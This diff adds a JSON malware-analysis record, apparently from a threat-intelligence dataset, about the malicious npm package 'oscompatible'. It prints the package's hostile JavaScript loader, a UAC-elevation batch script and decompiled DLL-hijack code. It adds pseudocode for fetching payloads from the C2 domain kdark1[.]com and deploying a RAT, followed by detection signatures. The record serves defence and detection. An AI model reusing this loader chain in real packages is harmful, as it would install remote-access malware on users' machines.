@@ -1,0 +1,247 @@
+{
+  "package_info": {
+    "package_name": "oscompatible",
+    "package_manager": "npm",
+    "package_versions": "2.3.2, 2.3.3, 2.3.4",
+    "why_malicious": "The package delivers a multi-stage malware chain targeting Windows systems. It masquerades as a compatibility tool but executes a bundled batch file that escalates privileges, leverages DLL hijacking, decrypts and executes further payloads in memory, and ultimately deploys a remote access trojan (RAT) with full system control and data exfiltration capabilities. The package employs sophisticated evasion, persistence, and privilege escalation techniques, making it highly dangerous."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when compat() is called)",
+        "file_location": "index.js",
+        "required_permissions": [
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "const { spawn } = require('child_process');\nconst path = require('path');\nconst os = require(\"os\");\n\nmodule.exports = {\n    compat: function() {\n      if (os.platform() === \"win32\") {\n        const binaryPath = path.join(__dirname, 'bin', 'autorun.bat');\n        const child = spawn(binaryPath, []);\n        child.stdout.on('data', (data) => {\n          console.log(`stdout: ${data}`);\n        });\n        \n        child.stderr.on('data', (data) => {\n          if(data.toString().indexOf(\"start-process\") != -1)\n          {\n            console.log( \"\\x1b[31m%s\\x1b[0m\", \"Can't access Microsoft Edge rendering engine.\");\n            process.exit();\n          }\n        });\n        \n        child.on('close', (code) => {\n        });\n      } else if (os.platform() === \"linux\") {\n        console.log(\n          \"\\x1b[31m%s\\x1b[0m\",\n          \"This script is running on Linux. Please run on Windows Server OS.\"\n        );\n      } else {\n        console.log(\n          \"\\x1b[31m%s\\x1b[0m\",\n          \"This script is running on an unrecognized OS. Please run on Windows Server OS.\"\n        );\n      }\n    }\n  };",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, when compat() is called, the code checks if the OS is Windows, spawns the bundled autorun.bat batch file from the package directory, and initiates the malware execution chain, resulting in the launch of further malicious components.",
+      "malice_analysis": {
+        "why_suspicious": "The code executes a bundled batch file without user interaction or clear documentation, which is highly unusual for a compatibility utility. The explicit OS check restricts execution to Windows, aligning with targeted malware behavior.",
+        "violated_expectations": "A legitimate compatibility package would not execute arbitrary batch files or require direct function invocation to trigger system-level changes, nor would it hide such actions from the user.",
+        "similar_legitimate_use": "Some legitimate packages may spawn child processes for setup or configuration, but not for launching hidden or unexplained binaries, especially without user consent.",
+        "key_indicators": [
+          "Spawning a bundled batch file (autorun.bat) from the package directory",
+          "OS check to restrict execution to Windows",
+          "No user-facing documentation or explanation for the batch file execution",
+          "Direct invocation of system-level scripts from a utility function"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (when autorun.bat is executed)",
+        "file_location": "bin/autorun.bat",
+        "required_permissions": [
+          "filesystem",
+          "process_execution",
+          "privilege_escalation"
+        ]
+      },
+      "code_snippet": "@echo off\n\npushd %~dp0\n\n:: echo %~dp0\n:: Check for administrator privileges\n>nul 2>&1 \"%SYSTEMROOT%\\system32\\cacls.exe\" \"%SYSTEMROOT%\\system32\\config\\system\"\n\n:: If the previous command returned with an error, ask for elevated permissions\nif %errorlevel% neq 0 (\n    :: echo Requesting administrative privileges...\n    :: Prompt for UAC elevation\n    powershell start-process \".\\app\\cookie_exporter.exe\" -Verb RunAs\n    exit /b\n)\n\n:: The rest of your script goes here with administrator privileges\n\npopd",
+      "code_language": "batch",
+      "code_behavior": "At runtime, when autorun.bat is executed, the script checks for administrator privileges, and if not present, uses PowerShell to launch cookie_exporter.exe with UAC elevation, prompting the user for admin rights and escalating privileges to execute the next stage.",
+      "malice_analysis": {
+        "why_suspicious": "The script attempts to escalate privileges by invoking a bundled executable with UAC, a common malware tactic to bypass user restrictions and gain elevated access for subsequent payloads.",
+        "violated_expectations": "Legitimate batch scripts rarely attempt privilege escalation without clear user intent, notification, or documentation, especially not by launching unexplained executables.",
+        "similar_legitimate_use": "Some installers may request elevation for legitimate setup, but not via hidden or unexplained binaries embedded in a compatibility tool.",
+        "key_indicators": [
+          "Privilege escalation via UAC prompt",
+          "Launching a suspicious executable (cookie_exporter.exe) from the app directory",
+          "No legitimate reason for elevation in a compatibility tool",
+          "Lack of user notification or consent for privilege escalation"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (when cookie_exporter.exe is launched with admin rights)",
+        "file_location": "app/cookie_exporter.exe",
+        "required_permissions": [
+          "filesystem",
+          "process_execution",
+          "DLL_loading",
+          "admin_privileges"
+        ]
+      },
+      "code_snippet": "hModule = LoadLibraryExA(\"msedge.dll\", (HANDLE)0x0, 0x1000);\nif (hModule == (HMODULE)0x0) {\n  DVar2 = GetLastError();\n  return DVar2;\n}\npFVar1 = GetProcAddress(hModule, \"ExportSpartanCookies\");\nif (pFVar1 != (FARPROC)0x0) {\n  _guard_check_icall();\n  DVar2 = (*UNRECOVERED_JUMPTABLE)();\n  return DVar2;\n}\nreturn 0x80004001;",
+      "code_language": "C/C++",
+      "code_behavior": "At runtime, when cookie_exporter.exe is launched with admin rights, the executable loads msedge.dll from the application directory using LoadLibraryExA, locates the ExportSpartanCookies export, and invokes it, thereby transferring execution to the next malicious stage via DLL hijacking.",
+      "malice_analysis": {
+        "why_suspicious": "The use of DLL search order hijacking to load a malicious DLL from the application directory, especially one with a revoked certificate, is a classic malware technique for code injection and evasion of security controls.",
+        "violated_expectations": "A legitimate signed executable should not load attacker-supplied DLLs from its own directory, particularly those with revoked or mismatched certificates.",
+        "similar_legitimate_use": "Some applications load plugins via DLLs, but not with revoked or attacker-supplied binaries, and not in a way that subverts normal DLL loading order.",
+        "key_indicators": [
+          "DLL search order hijacking (loading msedge.dll from local directory)",
+          "Loading a DLL with a revoked certificate",
+          "Calling a suspicious export (ExportSpartanCookies) to transfer execution",
+          "No legitimate plugin or extension mechanism documented"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (when msedge.dll is loaded and ExportSpartanCookies is called)",
+        "file_location": "app/msedge.dll",
+        "required_permissions": [
+          "filesystem",
+          "memory_execution",
+          "decryption"
+        ]
+      },
+      "code_snippet": "Open msedge.dat\nDecrypt msedge.dat using a 352-byte XOR key\nLoad resulting msedgedat.dll into memory and execute",
+      "code_language": "C/C++ (pseudocode)",
+      "code_behavior": "At runtime, when msedge.dll is loaded and ExportSpartanCookies is called, the DLL opens the encrypted msedge.dat file, decrypts it in memory using a 352-byte XOR key to produce msedgedat.dll, and loads and executes the resulting DLL directly in memory without writing it to disk.",
+      "malice_analysis": {
+        "why_suspicious": "In-memory decryption and execution of a DLL is a hallmark of advanced malware, designed to evade disk-based detection and forensic analysis.",
+        "violated_expectations": "Legitimate DLLs do not decrypt and execute hidden payloads from encrypted files, nor do they perform in-memory execution of untrusted code.",
+        "similar_legitimate_use": "Some security or anti-cheat tools may use in-memory loading for protection, but not for hidden, undocumented payloads.",
+        "key_indicators": [
+          "In-memory decryption and execution of DLL (msedgedat.dll)",
+          "Use of XOR key for obfuscation of payload",
+          "No disk artifacts for the loaded DLL",
+          "Accessing and decrypting a bundled encrypted file (msedge.dat)"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "runtime (when msedgedat.dll is executed in memory)",
+        "file_location": "memory (decrypted from msedge.dat)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "Connect to kdark1[.]com\nDownload zip file (dated 13012024)\nExtract and execute ud.exe, AnyDesk.exe, Band64.dll, RpcTest64.dll, verify (encrypted DLL)",
+      "code_language": "C/C++ (pseudocode)",
+      "code_behavior": "At runtime, when msedgedat.dll is executed in memory, the code connects to the remote C2 domain kdark1[.]com, downloads a zip archive (e.g., 13012024.zip), extracts multiple binaries including a fake update screen, remote access tools, and further encrypted payloads, and executes them to continue the attack chain.",
+      "malice_analysis": {
+        "why_suspicious": "Downloading and executing additional payloads from a remote server is a clear sign of a staged malware attack, enabling dynamic delivery of malicious components.",
+        "violated_expectations": "Legitimate software does not silently download and execute remote binaries, especially from suspicious or untrusted domains.",
+        "similar_legitimate_use": "Some updaters may fetch files from trusted servers, but not in an undocumented, hidden, or unverified manner.",
+        "key_indicators": [
+          "Connection to known malicious domain (kdark1[.]com)",
+          "Download and execution of remote binaries (ud.exe, AnyDesk.exe, etc.)",
+          "Use of fake update screens for deception",
+          "Extraction and execution of further encrypted payloads"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_6",
+      "execution_context": {
+        "trigger": "runtime (when verify.dll is decrypted and executed)",
+        "file_location": "memory (decrypted from verify in zip)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "persistence",
+          "input_capture"
+        ]
+      },
+      "code_snippet": "Register as scheduled task\nEstablish WebSocket connection to C2\nInstall Chrome extensions\nConfigure AnyDesk, hide screen, disable shutdown\nCapture keyboard and mouse events\nCollect file, extension, and browser history info",
+      "code_language": "C/C++ (pseudocode)",
+      "code_behavior": "At runtime, when verify.dll is decrypted and executed, the RAT registers itself as a scheduled task for persistence, establishes a WebSocket connection to the C2 server, installs Chrome extensions, configures AnyDesk for remote access, hides the screen, disables shutdown, captures keyboard and mouse events, and collects files, extension data, and browser history for exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "The code implements full-featured RAT capabilities, including persistence, remote control, surveillance, and data exfiltration, which are all hallmarks of advanced malware.",
+        "violated_expectations": "No legitimate compatibility tool would perform actions such as input capture, C2 communication, or browser manipulation.",
+        "similar_legitimate_use": "Some enterprise management tools may use scheduled tasks or remote access, but not in a hidden, undocumented, or user-invisible manner.",
+        "key_indicators": [
+          "Scheduled task registration for persistence",
+          "WebSocket C2 communication",
+          "Input capture (keyboard and mouse events)",
+          "Manipulation of AnyDesk and browser settings",
+          "Data exfiltration of files and browser history"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "User or script calls compat() from index.js, which spawns autorun.bat.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "autorun.bat execution"
+    },
+    {
+      "step": 2,
+      "action": "autorun.bat checks for admin privileges and launches cookie_exporter.exe with UAC elevation if needed.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "cookie_exporter.exe execution with admin rights"
+    },
+    {
+      "step": 3,
+      "action": "cookie_exporter.exe loads msedge.dll via DLL search order hijacking and calls ExportSpartanCookies.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "msedge.dll execution"
+    },
+    {
+      "step": 4,
+      "action": "msedge.dll decrypts msedge.dat to produce msedgedat.dll and executes it in memory.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "msedgedat.dll execution"
+    },
+    {
+      "step": 5,
+      "action": "msedgedat.dll connects to kdark1[.]com, downloads a zip archive, and extracts/executes further payloads.",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "verify.dll (RAT) deployment"
+    },
+    {
+      "step": 6,
+      "action": "verify.dll (RAT) establishes persistence, C2, and full system compromise.",
+      "implemented_by": [
+        "snippet_6"
+      ],
+      "leads_to": "Full remote access and data exfiltration"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Execution of bundled batch files or binaries from npm packages at runtime (e.g., autorun.bat, cookie_exporter.exe)",
+      "Privilege escalation attempts via UAC prompts for unsigned or suspicious executables",
+      "DLL search order hijacking with attacker-supplied DLLs (e.g., msedge.dll in app directory)",
+      "In-memory decryption and execution of DLLs (e.g., msedgedat.dll, verify.dll)",
+      "Network connections to known malicious domains (e.g., kdark1[.]com)",
+      "Download and execution of remote payloads (e.g., AnyDesk.exe, ud.exe)",
+      "Persistence via scheduled tasks registration",
+      "WebSocket-based C2 communication",
+      "Input capture and browser manipulation (e.g., Chrome extension installation, AnyDesk configuration)"
+    ],
+    "file_indicators": [
+      "index.js exporting a compat() function that spawns autorun.bat",
+      "bin/autorun.bat",
+      "app/cookie_exporter.exe (signed with legitimate but abused certificate)",
+      "app/msedge.dll (revoked certificate, references suspicious PDB path)",
+      "app/msedge.dat (encrypted payload)",
+      "In-memory DLLs: msedgedat.dll, verify.dll",
+      "Downloaded files: ud.exe, AnyDesk.exe, Band64.dll, RpcTest64.dll"
+    ],
+    "network_indicators": [
+      "Connections to kdark1[.]com",
+      "IP: 172.64.149.23",
+      "WebSocket C2 traffic",
+      "Download of zip files with date-based naming (e.g., 13012024.zip)"
+    ],
+    "how_to_detect": "Monitor for npm packages that execute bundled batch files or binaries at runtime, especially those that attempt privilege escalation or load DLLs from their own directory. Flag packages containing suspicious binaries (e.g., cookie_exporter.exe, msedge.dll, msedge.dat) or those that connect to known malicious domains such as kdark1[.]com. Use endpoint monitoring to detect in-memory DLL execution, scheduled task creation, and WebSocket C2 traffic. Alert on the presence of revoked or mismatched code signing certificates in package binaries. Correlate behavioral signatures such as input capture, browser manipulation, and AnyDesk configuration with the presence of these files and network indicators."
+  }
+}
